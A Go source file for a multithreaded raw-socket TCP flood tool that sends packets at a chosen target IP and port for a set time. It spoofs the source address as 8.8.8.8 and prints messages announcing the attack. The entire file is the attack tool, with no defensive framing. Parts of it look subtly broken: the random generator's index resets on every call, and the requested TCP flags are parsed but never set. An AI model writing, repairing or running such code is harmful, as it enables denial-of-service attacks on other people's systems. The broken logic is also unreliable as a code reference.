// This is released under the GNU GPL License v3.0, and is allowed to be used for commercial products ;)

package main

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

const MAX_PACKET_SIZE = 4096
const PHI = 0x9e3779b9

var Q [4096]uint32
var c uint32 = 362436
var floodport uint16
var limiter int
var pps uint32
var sleeptime uint32 = 100

var ack, syn, psh, fin, rst, urg, ptr, res2, seq int

// Initialize random number generator
func initRand(seed uint32) {
	Q[0] = seed
	Q[1] = seed + PHI
	Q[2] = seed + 2*PHI
	for i := 3; i < 4096; i++ {
		Q[i] = Q[i-3] ^ Q[i-2] ^ PHI ^ uint32(i)
	}
}

// Random number generator (Complementary-Multiply-With-Carry)
// Random number generator (Complementary-Multiply-With-Carry)
func randCMWC() uint32 {
	const a uint64 = 18782
	var r uint32 = 0xfffffffe
	staticI := uint32(4095) // Index for the static state variable
	staticI = (staticI + 1) & 4095
	t := a*uint64(Q[staticI]) + uint64(c) // Use uint64 for the multiplication to avoid overflow
	c = uint32(t >> 32)                   // Cast the higher 32 bits back to uint32
	x := uint32(t + uint64(c))            // Sum and cast back to uint32

	if x < c {
		x++
		c++
	}

	Q[staticI] = r - x
	return Q[staticI]
}


// Calculate checksum
func checksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i < len(data)-1; i += 2 {
		sum += uint32(data[i])<<8 + uint32(data[i+1])
	}
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8
	}
	for (sum >> 16) > 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}

// Set up the IP header for the packet
func setupIPHeader(ipHeader []byte, dstIP string) {
	ipHeader[0] = 0x45 // version and header length
	ipHeader[1] = 0x00 // TOS
	ipHeader[2] = 0x00 // total length (set later)
	ipHeader[3] = 0x00
	ipHeader[4] = byte(randCMWC() >> 8) // ID
	ipHeader[5] = byte(randCMWC() & 0xff)
	ipHeader[6] = 0x00 // flags and fragment offset
	ipHeader[7] = 0x00
	ipHeader[8] = 64 // TTL
	ipHeader[9] = syscall.IPPROTO_TCP
	copy(ipHeader[12:16], net.ParseIP("8.8.8.8").To4()) // source IP
	copy(ipHeader[16:20], net.ParseIP(dstIP).To4())     // destination IP
}

// Set up the TCP header for the packet
func setupTCPHeader(tcpHeader []byte) {
	tcpHeader[0] = byte(randCMWC() >> 8) // source port
	tcpHeader[1] = byte(randCMWC() & 0xff)
	tcpHeader[2] = byte(floodport >> 8)  // destination port
	tcpHeader[3] = byte(floodport & 0xff)
	// TCP flags, window size, and checksum will be set later
}

// Flood function to send packets
func flood(target string) {
	ipHeader := make([]byte, 20)
	tcpHeader := make([]byte, 20)
	dstAddr := &syscall.SockaddrInet4{
		Port: int(floodport),
		Addr: [4]byte{},
	}

	copy(dstAddr.Addr[:], net.ParseIP(target).To4())

	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
	if err != nil {
		fmt.Println("Could not open raw socket:", err)
		os.Exit(-1)
	}

	for {
		setupIPHeader(ipHeader, target)
		setupTCPHeader(tcpHeader)

		// Set checksums
		ipHeader[10] = byte(checksum(ipHeader[:]) >> 8)
		ipHeader[11] = byte(checksum(ipHeader[:]) & 0xff)
		tcpHeader[16] = byte(checksum(tcpHeader) >> 8)
		tcpHeader[17] = byte(checksum(tcpHeader) & 0xff)

		packet := append(ipHeader, tcpHeader...)

		syscall.Sendto(fd, packet, 0, dstAddr)

		pps++
		if limiter > 0 && pps > uint32(limiter) {
			time.Sleep(time.Duration(sleeptime) * time.Microsecond)
			pps = 0
		}
	}
}

// Main function to parse arguments and start the attack
func main() {
	if len(os.Args) < 7 {
		fmt.Printf("Usage: %s <target IP> <port> <threads> <pps limiter, -1 for no limit> <time> <flags>\n", os.Args[0])
		os.Exit(-1)
	}

	target := os.Args[1]
	floodport = uint16(mustAtoi(os.Args[2]))
	numThreads := mustAtoi(os.Args[3])
	maxPPS := mustAtoi(os.Args[4])
	duration := mustAtoi(os.Args[5])
	flags := os.Args[6]

	setFlags(flags)

	limiter = maxPPS
	pps = 0

	fmt.Println("Opening sockets...")

	var wg sync.WaitGroup
	for i := 0; i < numThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			flood(target)
		}()
	}

	time.Sleep(time.Duration(duration) * time.Second)
	fmt.Println("Stopping attack...")
}

// Helper to convert string to integer
func mustAtoi(s string) int {
	v, err := strconv.Atoi(s)
	if err != nil {
		fmt.Println("Invalid parameter:", s)
		os.Exit(-1)
	}
	return v
}

// Set flags for TCP options
func setFlags(flags string) {
	ack = boolToInt(strings.Contains(flags, "ack"))
	syn = boolToInt(strings.Contains(flags, "syn"))
	psh = boolToInt(strings.Contains(flags, "psh"))
	fin = boolToInt(strings.Contains(flags, "fin"))
	rst = boolToInt(strings.Contains(flags, "rst"))
	urg = boolToInt(strings.Contains(flags, "urg"))
	ptr = boolToInt(strings.Contains(flags, "ptr"))
	res2 = boolToInt(strings.Contains(flags, "res2"))
	seq = boolToInt(strings.Contains(flags, "seq"))
}

// Helper to convert boolean to integer
func boolToInt(b bool) int {
	if b {
		return 1
	}
	return 0
}
